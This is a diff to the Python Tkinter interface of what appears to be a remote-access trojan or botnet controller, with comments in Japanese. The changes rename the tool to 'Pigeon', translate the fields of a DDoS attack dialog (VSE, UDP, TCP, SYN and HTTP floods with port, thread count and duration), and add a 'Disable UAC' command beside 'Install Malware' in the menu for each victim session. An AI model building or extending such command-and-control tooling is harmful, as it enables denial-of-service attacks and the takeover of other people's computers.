@@ -5,19 +5,18 @@ import threading
 import json
 import time
 from datetime import datetime
-from vidstream import StreamingServer
-import numpy as np
 import requests
 import sys
 import msgpack
 
+
 # グローバル変数
-sessions = {}
+sessions = {} #セッション情報格納するところ
 server_socket = None
 server_thread = None
 monitor_thread = None
 capture_sessions = {} #カメラセッション情報
-log_window = None
+log_window = None # ログウィンドウを初期化
 log_table = None  # ここでlog_tableを初期化
 
 # サーバーのログを更新する関数
@@ -171,22 +170,22 @@ def ddos_message():
     urlbox = ttk.Entry(modal_dialog)
     urlbox.pack()
     
-    labellayer = ttk.Label(modal_dialog, text="攻撃の種類")
+    labellayer = ttk.Label(modal_dialog, text="Attack Layer")
     labellayer.pack()
     layerbox = ttk.Combobox(modal_dialog, values=["VSE", "UDP", "TCP", "SYN", "HTTP"])
     layerbox.pack()
     
-    labelport = ttk.Label(modal_dialog, text="ポート")
+    labelport = ttk.Label(modal_dialog, text="Port")
     labelport.pack()
     portbox = ttk.Spinbox(modal_dialog, from_=1, to=9999, increment=1)
     portbox.pack()
 
-    labelthr = ttk.Label(modal_dialog, text="スレッド数")
+    labelthr = ttk.Label(modal_dialog, text="Thread")
     labelthr.pack()
     thrlevel = ttk.Spinbox(modal_dialog, from_=1, to=9999, increment=1)
     thrlevel.pack()
     
-    labelsecs = ttk.Label(modal_dialog, text="秒数")
+    labelsecs = ttk.Label(modal_dialog, text="seconds")
     labelsecs.pack()
     secsbox = ttk.Spinbox(modal_dialog, from_=1, to=9999, increment=0.000001)
     secsbox.pack()
@@ -210,9 +209,10 @@ def show_context_menu(event):
         item = session_table.selection()[0]
         session_id = session_table.item(item, 'values')[0]
         menu = tk.Menu(root, tearoff=0)
-        menu.add_command(label="Install Malware", command=lambda: send_to_client(session_id, ""))
+        menu.add_command(label="Install Malware", command=lambda: send_to_client(session_id, dataproccessor([""])))
         menu.add_command(label="Send Custom Message", command=lambda: send_custom_message(session_id))
-        menu.add_command(label="Exit Client", command=lambda: send_to_client(session_id, "exit"))
+        menu.add_command(label="Disable UAC", command=lambda: send_to_client(session_id, dataproccessor(["DisableUAC"])))
+        menu.add_command(label="Exit Client", command=lambda: send_to_client(session_id, dataproccessor(["exit"])))
         menu.post(event.x_root, event.y_root)
     except IndexError:
         log_message("WARNING", "Session is None")
@@ -220,7 +220,7 @@ def show_context_menu(event):
 def send_custom_message(session_id):
     message = simpledialog.askstring("Send Message", f"Enter message for session ID {session_id}:")
     if message:
-        send_to_client(session_id, message)
+        send_to_client(session_id, dataproccessor([message]))
 
 def show_log_window():
     global log_window, log_table
@@ -241,14 +241,14 @@ def show_log_window():
         log_window.deiconify()  # ウィンドウを再表示
 
 def show_ver_window():
-    messagebox.showinfo("About FuckBTS", "FuckBTS ver.0.0.0")
+    messagebox.showinfo("About Pigeon", "Pigeon ver.0.0.0")
 
 def on_closing():
     stop_server()
     root.destroy()
 
 root = tk.Tk()
-root.title("FuckBTS ver.0.0.0")
+root.title("Pigeon ver.0.0.0")
 
 # メニューバーの作成
 menu_bar = tk.Menu(root)
